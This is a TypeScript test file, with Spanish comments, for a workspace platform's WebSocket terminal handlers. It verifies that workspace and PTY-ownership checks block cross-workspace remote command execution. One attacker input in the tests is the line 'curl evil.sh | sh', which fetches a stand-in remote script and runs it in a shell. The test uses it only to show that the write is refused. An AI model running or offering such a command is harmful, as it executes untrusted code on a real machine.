/**
 * WS terminal handlers — contract-boundary (TER-480, grupo archivos/io).
 *
 * Lo CRÍTICO de terminal: un PTY es shell interactivo dentro del contenedor
 * bash del workspace — terminal.input a un PTY ajeno es ejecución remota de
 * comandos en la máquina de otro. Regresión del fix de authz: create verifica
 * acceso al workspace de la app (getApp NO lo hacía pese a su comentario),
 * el reuse exige mismo workspace, e input/resize/destroy/subscribe verifican
 * el owner del PTY (fail-closed si la sesión no registró owner). Los handlers
 * son inline: se testean vía register() con un router fake.
 */

import { describe, expect, it, mock } from 'bun:test';
import type { WsHandlerContext } from '@teros/shared';
import { register } from '../../src/handlers/domains/terminal/index';

const ctx = (userId: string): WsHandlerContext =>
  ({ userId, sessionId: 'sess1', connectionId: 'c1' }) as any;

function makeRouter() {
  const handlers = new Map<string, (ctx: WsHandlerContext, data: unknown) => Promise<any>>();
  const router = {
    register: (action: string, handler: any) => {
      if (handlers.has(action)) throw new Error(`duplicate action ${action}`);
      handlers.set(action, handler);
    },
  } as any;
  return { router, handlers };
}

/** Fake fiel a PtyManager: write/resize/destroy son no-op sin sesión; create no-op si existe. */
function makePtyManager(seed: Array<{ terminalId: string; ownerWorkspaceId?: string }> = []) {
  const sessions = new Map(seed.map((s) => [s.terminalId, { ...s }]));
  const calls = { create: [] as any[], write: [] as any[], resize: [] as any[], destroy: [] as any[] };
  return {
    calls,
    sessions,
    has: (id: string) => sessions.has(id),
    ownerOf: (id: string) => sessions.get(id)?.ownerWorkspaceId,
    create(id: string, containerId: string, cols: number, rows: number, owner?: string) {
      calls.create.push([id, containerId, cols, rows, owner]);
      if (sessions.has(id)) return;
      sessions.set(id, { terminalId: id, ownerWorkspaceId: owner });
    },
    write(id: string, data: string) {
      if (!sessions.has(id)) return;
      calls.write.push([id, data]);
    },
    resize(id: string, cols: number, rows: number) {
      if (!sessions.has(id)) return;
      calls.resize.push([id, cols, rows]);
    },
    destroy(id: string) {
      if (!sessions.has(id)) return;
      calls.destroy.push([id]);
      sessions.delete(id);
    },
  } as any;
}

/** Mock db fiel a canAccessWorkspace (workspaces.ownerId + workspace_members). */
function makeAuthDb(opts: { ownerByWorkspace?: Record<string, string>; members?: Array<[string, string]> } = {}) {
  return {
    collection: (name: string) => ({
      findOne: async (filter: any) => {
        if (name === 'workspaces') {
          return { workspaceId: filter.workspaceId, ownerId: opts.ownerByWorkspace?.[filter.workspaceId] ?? 'nobody', status: 'active' };
        }
        if (name === 'workspace_members') {
          return (opts.members ?? []).some(([w, u]) => w === filter.workspaceId && u === filter.userId)
            ? { workspaceId: filter.workspaceId, userId: filter.userId }
            : null;
        }
        return null;
      },
    }),
  } as any;
}

const APP = { appId: 'app_abcdef1234567890', ownerType: 'workspace', ownerId: 'work_mine' };

function setup(opts: {
  app?: any;
  ptySeed?: Array<{ terminalId: string; ownerWorkspaceId?: string }>;
  ownerByWorkspace?: Record<string, string>;
  members?: Array<[string, string]>;
  execResult?: string;
} = {}) {
  const { router, handlers } = makeRouter();
  const ptyManager = makePtyManager(opts.ptySeed);
  const pubSubService = {
    subscribeSession: mock(() => {}),
    unsubscribeSession: mock(() => {}),
  } as any;
  const mcaService = { getApp: mock(async () => opts.app ?? null) } as any;
  const mcaManager = { executeTool: mock(async () => ({})) } as any;
  const exec = mock(() => opts.execResult ?? 'mca-teros-bash-34567890\n');
  register(router, {
    pubSubService,
    ptyManager,
    mcaService,
    mcaManager,
    db: makeAuthDb({ ownerByWorkspace: opts.ownerByWorkspace, members: opts.members }),
    exec,
  });
  return { handlers, ptyManager, pubSubService, mcaService, mcaManager, exec };
}

// ---------------------------------------------------------------------------
// Registro (invariante)
// ---------------------------------------------------------------------------

describe('terminal register', () => {
  it('registra exactamente las 6 actions del dominio', () => {
    const { handlers } = setup();
    expect([...handlers.keys()].sort()).toEqual([
      'terminal.create',
      'terminal.destroy',
      'terminal.input',
      'terminal.resize',
      'terminal.subscribe',
      'terminal.unsubscribe',
    ]);
  });
});

// ---------------------------------------------------------------------------
// terminal.create
// ---------------------------------------------------------------------------

describe('terminal.create — validación + authz', () => {
  it('MISSING_TERMINAL_ID / MISSING_APP_ID', async () => {
    const { handlers } = setup();
    await expect(handlers.get('terminal.create')!(ctx('u1'), { appId: 'app_1' })).rejects.toMatchObject({ code: 'MISSING_TERMINAL_ID' });
    await expect(handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't1' })).rejects.toMatchObject({ code: 'MISSING_APP_ID' });
  });

  it('APP_NOT_FOUND si la app no existe', async () => {
    const { handlers } = setup({ app: null });
    await expect(
      handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't1', appId: 'app_nope' }),
    ).rejects.toMatchObject({ code: 'APP_NOT_FOUND' });
  });

  it('FORBIDDEN_WORKSPACE si el caller no es miembro del workspace de la app — sin warmup, sin PTY, sin subscribe', async () => {
    const { handlers, ptyManager, pubSubService, mcaManager } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: 'victim' },
      members: [],
    });
    await expect(
      handlers.get('terminal.create')!(ctx('attacker'), { terminalId: 't1', appId: APP.appId }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_WORKSPACE' });
    expect(mcaManager.executeTool).not.toHaveBeenCalled();
    expect(ptyManager.calls.create).toEqual([]);
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled();
  });

  it('happy: warmup + docker ps por suffix, PTY con owner workspace, subscribe y payload exacto', async () => {
    const { handlers, ptyManager, pubSubService, mcaManager, exec } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: 'u1' },
    });
    const res = await handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't1', appId: APP.appId });
    expect(res).toEqual({ terminalId: 't1', cols: 80, rows: 24 });
    expect(mcaManager.executeTool).toHaveBeenCalledWith(
      'bash_bash',
      { command: 'true', description: 'warmup' },
      { appId: APP.appId, userId: 'u1' },
    );
    // suffix = últimos 8 chars del appId sin 'app_'
    expect(exec).toHaveBeenCalledWith('docker ps --filter "name=mca-teros-bash-34567890" --format "{{.Names}}"');
    expect(ptyManager.calls.create).toEqual([['t1', 'mca-teros-bash-34567890', 80, 24, 'work_mine']]);
    expect(pubSubService.subscribeSession).toHaveBeenCalledWith('sess1', 'terminal:t1');
  });

  it('respeta cols/rows custom', async () => {
    const { handlers, ptyManager } = setup({ app: APP, ownerByWorkspace: { work_mine: 'u1' } });
    const res = await handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't1', appId: APP.appId, cols: 120, rows: 40 });
    expect(res).toEqual({ terminalId: 't1', cols: 120, rows: 40 });
    expect(ptyManager.calls.create).toEqual([['t1', 'mca-teros-bash-34567890', 120, 40, 'work_mine']]);
  });

  it('warmup que no encuentra contenedor → error y SIN suscripción residual (regresión del reorden)', async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: 'u1' },
      execResult: '\n',
    });
    await expect(
      handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't1', appId: APP.appId }),
    ).rejects.toThrow('not found after warmup');
    expect(ptyManager.calls.create).toEqual([]);
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled();
  });
});

describe('terminal.create — reuse multi-tab', () => {
  it('PTY existente del MISMO workspace → reused:true, subscribe, sin warmup ni create', async () => {
    const { handlers, ptyManager, pubSubService, mcaManager } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: 'u1' },
      ptySeed: [{ terminalId: 't1', ownerWorkspaceId: 'work_mine' }],
    });
    const res = await handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't1', appId: APP.appId });
    expect(res).toEqual({ terminalId: 't1', cols: 80, rows: 24, reused: true });
    expect(mcaManager.executeTool).not.toHaveBeenCalled();
    expect(ptyManager.calls.create).toEqual([]);
    expect(pubSubService.subscribeSession).toHaveBeenCalledWith('sess1', 'terminal:t1');
  });

  it('PTY existente de OTRO workspace → FORBIDDEN_TERMINAL sin subscribe (no se puede attachear a terminales ajenos)', async () => {
    const { handlers, pubSubService } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: 'u1' },
      ptySeed: [{ terminalId: 't_victim', ownerWorkspaceId: 'work_victim' }],
    });
    await expect(
      handlers.get('terminal.create')!(ctx('u1'), { terminalId: 't_victim', appId: APP.appId }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_TERMINAL' });
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// terminal.input / resize / destroy — ownership del PTY
// ---------------------------------------------------------------------------

describe('terminal.input — el gate que evita RCE cross-workspace', () => {
  it('MISSING_TERMINAL_ID sin terminalId', async () => {
    const { handlers } = setup();
    await expect(handlers.get('terminal.input')!(ctx('u1'), { data: 'ls\n' })).rejects.toMatchObject({ code: 'MISSING_TERMINAL_ID' });
  });

  it('PTY ajeno → FORBIDDEN_TERMINAL y NO escribe keystrokes', async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: 't_victim', ownerWorkspaceId: 'work_victim' }],
      ownerByWorkspace: { work_victim: 'victim' },
      members: [],
    });
    await expect(
      handlers.get('terminal.input')!(ctx('attacker'), { terminalId: 't_victim', data: 'curl evil.sh | sh\n' }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_TERMINAL' });
    expect(ptyManager.calls.write).toEqual([]);
  });

  it('PTY sin owner registrado → FORBIDDEN_TERMINAL (fail-closed)', async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: 't_legacy' }],
      ownerByWorkspace: {},
    });
    await expect(
      handlers.get('terminal.input')!(ctx('u1'), { terminalId: 't_legacy', data: 'ls\n' }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_TERMINAL' });
    expect(ptyManager.calls.write).toEqual([]);
  });

  it('PTY propio (miembro del workspace) → write con args exactos', async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: 't1', ownerWorkspaceId: 'work_mine' }],
      ownerByWorkspace: { work_mine: 'someone' },
      members: [['work_mine', 'u1']],
    });
    const res = await handlers.get('terminal.input')!(ctx('u1'), { terminalId: 't1', data: 'echo hi\n' });
    expect(res).toEqual({ ok: true });
    expect(ptyManager.calls.write).toEqual([['t1', 'echo hi\n']]);
  });

  it('sin sesión PTY → {ok:true} no-op (comportamiento PtyManager preservado)', async () => {
    const { handlers, ptyManager } = setup();
    const res = await handlers.get('terminal.input')!(ctx('u1'), { terminalId: 't_gone', data: 'ls\n' });
    expect(res).toEqual({ ok: true });
    expect(ptyManager.calls.write).toEqual([]);
  });
});

describe('terminal.resize', () => {
  it('PTY ajeno → FORBIDDEN_TERMINAL sin resize', async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: 't_victim', ownerWorkspaceId: 'work_victim' }],
    });
    await expect(
      handlers.get('terminal.resize')!(ctx('attacker'), { terminalId: 't_victim', cols: 1, rows: 1 }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_TERMINAL' });
    expect(ptyManager.calls.resize).toEqual([]);
  });

  it('PTY propio → resize(terminalId, cols, rows) exactos', async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: 't1', ownerWorkspaceId: 'work_mine' }],
      ownerByWorkspace: { work_mine: 'u1' },
    });
    const res = await handlers.get('terminal.resize')!(ctx('u1'), { terminalId: 't1', cols: 132, rows: 50 });
    expect(res).toEqual({ ok: true });
    expect(ptyManager.calls.resize).toEqual([['t1', 132, 50]]);
  });
});

describe('terminal.destroy', () => {
  it('PTY ajeno → FORBIDDEN_TERMINAL: no destruye ni toca suscripciones', async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      ptySeed: [{ terminalId: 't_victim', ownerWorkspaceId: 'work_victim' }],
    });
    await expect(
      handlers.get('terminal.destroy')!(ctx('attacker'), { terminalId: 't_victim' }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_TERMINAL' });
    expect(ptyManager.calls.destroy).toEqual([]);
    expect(pubSubService.unsubscribeSession).not.toHaveBeenCalled();
  });

  it('PTY propio → destroy + unsubscribe del topic', async () => {
    const { handlers, ptyManager, pubSubService } = setup({
      ptySeed: [{ terminalId: 't1', ownerWorkspaceId: 'work_mine' }],
      ownerByWorkspace: { work_mine: 'u1' },
    });
    const res = await handlers.get('terminal.destroy')!(ctx('u1'), { terminalId: 't1' });
    expect(res).toEqual({ ok: true });
    expect(ptyManager.calls.destroy).toEqual([['t1']]);
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith('sess1', 'terminal:t1');
  });

  it('sin sesión PTY → {ok:true} y limpia la suscripción propia', async () => {
    const { handlers, pubSubService } = setup();
    const res = await handlers.get('terminal.destroy')!(ctx('u1'), { terminalId: 't_gone' });
    expect(res).toEqual({ ok: true });
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith('sess1', 'terminal:t_gone');
  });
});

// ---------------------------------------------------------------------------
// terminal.subscribe / unsubscribe
// ---------------------------------------------------------------------------

describe('terminal.subscribe — requiere PTY vivo + acceso', () => {
  it('sin PTY → TERMINAL_NOT_FOUND (sin pre-subscripciones ciegas a ids futuros)', async () => {
    const { handlers, pubSubService } = setup();
    await expect(
      handlers.get('terminal.subscribe')!(ctx('u1'), { terminalId: 't_future' }),
    ).rejects.toMatchObject({ code: 'TERMINAL_NOT_FOUND' });
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled();
  });

  it('PTY ajeno → FORBIDDEN_TERMINAL (el output de un shell ajeno no se espía)', async () => {
    const { handlers, pubSubService } = setup({
      ptySeed: [{ terminalId: 't_victim', ownerWorkspaceId: 'work_victim' }],
    });
    await expect(
      handlers.get('terminal.subscribe')!(ctx('attacker'), { terminalId: 't_victim' }),
    ).rejects.toMatchObject({ code: 'FORBIDDEN_TERMINAL' });
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled();
  });

  it('PTY propio → {terminalId, topic} + subscribe', async () => {
    const { handlers, pubSubService } = setup({
      ptySeed: [{ terminalId: 't1', ownerWorkspaceId: 'work_mine' }],
      ownerByWorkspace: { work_mine: 'u1' },
    });
    const res = await handlers.get('terminal.subscribe')!(ctx('u1'), { terminalId: 't1' });
    expect(res).toEqual({ terminalId: 't1', topic: 'terminal:t1' });
    expect(pubSubService.subscribeSession).toHaveBeenCalledWith('sess1', 'terminal:t1');
  });
});

describe('terminal.unsubscribe — siempre permitido (solo quita la suscripción propia)', () => {
  it('MISSING_TERMINAL_ID sin terminalId', async () => {
    const { handlers } = setup();
    await expect(handlers.get('terminal.unsubscribe')!(ctx('u1'), {})).rejects.toMatchObject({ code: 'MISSING_TERMINAL_ID' });
  });

  it('devuelve {terminalId} y desuscribe aunque no exista PTY', async () => {
    const { handlers, pubSubService } = setup();
    const res = await handlers.get('terminal.unsubscribe')!(ctx('u1'), { terminalId: 't_gone' });
    expect(res).toEqual({ terminalId: 't_gone' });
    expect(pubSubService.unsubscribeSession).toHaveBeenCalledWith('sess1', 'terminal:t_gone');
  });
});
